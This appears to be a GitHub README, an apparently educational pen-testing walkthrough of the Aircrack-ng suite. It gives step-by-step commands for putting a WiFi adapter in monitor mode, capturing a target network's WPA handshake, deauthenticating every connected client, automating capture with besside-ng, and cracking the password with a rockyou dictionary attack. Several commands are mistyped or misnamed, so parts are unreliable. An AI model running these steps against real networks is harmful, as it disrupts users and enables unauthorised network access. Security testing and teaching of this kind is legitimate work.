# Aircrack-ng Suite

Aircrack-ng is an open source tool for cracking and securing wireless network.  It is all in one suite allows you to keep an eye on WiFi security, and capture data packets. WiFi cards can be captured and injected to test their performance. It can also be used by pen testers to attack and crack the WPA and WEP protocols.

It mainly focuses on four areas of wifi security:

-  **Monitoring:** Data is captured in packets and exported to text files for processing by third-party software.

-  **Attacking:**  Packet injection can be used to perform replay attacks, deauthentication, and create bogus access points, among other things.

-  **Testing:** Testing the capabilities of WiFi cards and drivers

-  **Cracking:** WEP and WPA1/WPA2 PSK.

There are several aircrack-ng modes (Click here to view) but we are using only the following modes.

- [Airmon-ng:](https://www.aircrack-ng.org/doku.php?id=airmon-ng)  It's used to switch between monitor and managed modes. The status of the interfaces can be viewed by running the airmon-ng command without any parameters. It can also list and kill programmes that may cause the wireless card to malfunction.
- [Airodump-ng:](https://www.aircrack-ng.org/doku.php?id=airodump-ng): Airdump-ng is a tool that lists all of the networks in our immediate vicinity and displays relevant information about them. It's a packet sniffer, which means it's meant to capture all of the packets that pass across our network when we're in Monitor mode. We may run it against all of the networks to gather relevant information such as the mac address, channel name, encryption type, and number of clients connected to the network, and then begin targeting the target network. We can also use it against a specific AP (access point) to collect only packets from a specific Wi-Fi network.

- [Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng): Aireplay-ng is a programme that generates unnecessary wireless traffic. It can hack WEP and WPA keys when combined with aircrack-ng. It's function is to insert frames. aireplay-ng has the ability to perform a variety of powerful strikes, including the creation and capture of new IVs. [Here](https://www.aircrack-ng.org/doku.php?id=aireplay-ng) are some other forms of attacks:

- [besside-ng](https://www.aircrack-ng.org/doku.php?id=besside-ng): It is the best of both worlds. It automatically cracks WEP and WPA network. Note Wesside-ng supports only WEP but Besside-ng can support both WEP and WPA network.Besside-ng has the capability to crack all the associated WEP networks and log the WPA handshakes. And WPA handshakes can then be cracked using aircrack-ng. It is a combination of easside-ng and wesside-ng. 
	- [Easside-ng:](https://www.aircrack-ng.org/doku.php?id=easside-ng)
Easside-ng is a tool which allows to communicate via an WEP-encrypted access point (AP) without knowing the WEP key. It first identifies a network, then proceeds to associate with it, obtain PRGA (pseudo random generation algorithm) xor data, determine the network IP scheme and then setup a TAP interface so that one can communicate with the AP without requiring the WEP key. All this is done automatically.
	- [Wesside-ng:](https://www.aircrack-ng.org/doku.php?id=wesside-ng)
Wesside-ng is a tool which incorporates a number of techniques to seamlessly obtain a WEP key in minutes. It first identifies a network, then proceeds to associate with it, obtain PRGA (pseudo random generation algorithm) xor data, determine the network IP scheme, reinject ARP requests and finally determine the WEP key. All this is done automatically.

## Pre-requisites:

- **Software:** We are using Kali Linux through VMware.

- **Hardware:** Wifi adaptor is necessary to inject packets and attack Wifi. Our laptop only has only inbuilt wifi adapter, which is insufficient. To put it another way, we require a wireless adapter that supports monitor mode and packet injection. [Here](https://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles.html) is a list of compatible adapters for pen testing.

The chipset we have is the TP-LINK TL-WN722N.


<p align="center"><img src="https://github.com/megha-511/Aircrack-ng/blob/716796cfbd5b0d5b0b79b8e839f5a37b44827c3c/tplink.jpg" width="300" height="300"></p>

However, according to the list of compatible adaptors, Version 1 is the only version that is compatible, yet we received Version 3. To enable the monitor mode in V3, we followed a few steps. [Click here to view the steps](https://github.com/megha-511/Aircrack-ng/blob/8083e818320b3b7c8485f83ef2c2c9ac05138571/Enable%20monitoring%20mode%20in%20V2_3.docx)

## 1. Crack WPA

1. 

    sudo airmon-ng wlan0
    
    iwconfig

This should show wlan0 in monitor mode.

2.

Sudo airmon-ng

Wlan0 must be changed to wlan0mon by now if not follow the steps below: ([Source)](https://www.reddit.com/r/Kalilinux/comments/nm14i5/my_wlan0_doesnt_change_to_wlan0mon_but_it_shows/)

`sudo airmon-ng stop wlan0`

`sudo Systemctl disable NetworkManager`

`sudo ip link set wlan0 down`

`sudo ip link set wlan0 name wlan0mon`

`sudo systemctl enable NetworkManager`

Now check for iwconfig it should show up wlan0mon.

3. To get the bssid of the target network and channel number: `sudo airodump wlan0mon`

4. `sudo airodump wlan0mon -d <target bssid>`

5. Wait until some connections are found

6. `sudo airodump -w wifiHack1 -c <channel_number> --bssid <target bssid> wlanomon`

  - w : write to wifiHack1 file which is used to store the 4 way handshake

7. In a separate window let’s deauthenticate all the users. When they connect back we can capture the handshake. `sudo aireplay –deauth 0 -a <bssid> wlan0mon`

8. Until new client joins the network please wait. You can see handshake on the top right corner of the screen where you hit airodump query.

9. Once handshake is captured, perform following tasks to do dictionary attack on the capture file to retrieve the wifi password.

-

sudo airmon-ng stop wlan0mon

sudo aircrack-ng wifiHack1-01.cap -w /usr/share/wordlists/rockyou.txt

That’s it! The wifi password will be cracked if it is common and simple by using dictionary attack. For complex passwords we need a strong GPU processor to crack it.

## 2. besside-ng

- How besside works?
<p align="center"><img src="https://github.com/megha-511/Aircrack-ng/blob/716796cfbd5b0d5b0b79b8e839f5a37b44827c3c/How%20besside-ng%20works.jpg" width="300" height="300"></p>

- We have followed the below steps to auto capture the WPA handshake and crack using aircrack-ng:

1.  `sudo airmon-ng start wlan0mon`

2. Capture the bssid of the target network: `sudo airodump-ng wlan0mon`

3. `sudo airodump -w bessideHack -c <channel number> -d <bssid of the target> wlan0mon`

4. To autogenerate the capture file called wpa.cap: `sudo besside-ng -b <bssid>  wlan0mon`

- There is a small problem with besside as it creates malformed packets and no management frames. There is a work around for this,  we need to merge the capture files generated by airodump and the besside. [Source](https://security.stackexchange.com/questions/121636/missing-essid-from-aircrack-ng)

- `Mergecap -w merged.cap bessideHack.cap wpa.cap`

- `Wireshark merged.cap`

- Open .cap file with Wireshark: `wireshark wpa.cap`

- Right-click on the malformed packet and choose “Ignore”

- File -> Export Specified Packets

- Select “Remove Ignored Packets”

- Save the file as wpa1.pcap

6. `sudo aircrack-ng wpa1.pcap -w /usr/share/wordlists/rockyou.txt`

### Reference and Additional resources:
- [Frame injection](https://github.com/aircrack-ng/rtl8188eus)
- [Frame Vs Packet](https://www.networkworld.com/article/3225865/ethernet-frames-and-packets-whats-the-difference.html)
- [Fragment and Forge: Breaking Wi-Fi Through Frame Aggregation and Fragmentation](https://papers.mathyvanhoef.com/usenix2021.pdf)
- [4-way Handshake attack](https://netbeez.net/blog/secure-network-4-way-handshake/#:~:text=The%204-Way%20Handshake%20utilizes,Handshake%20occurs%20after%20EAP%20authentication.)
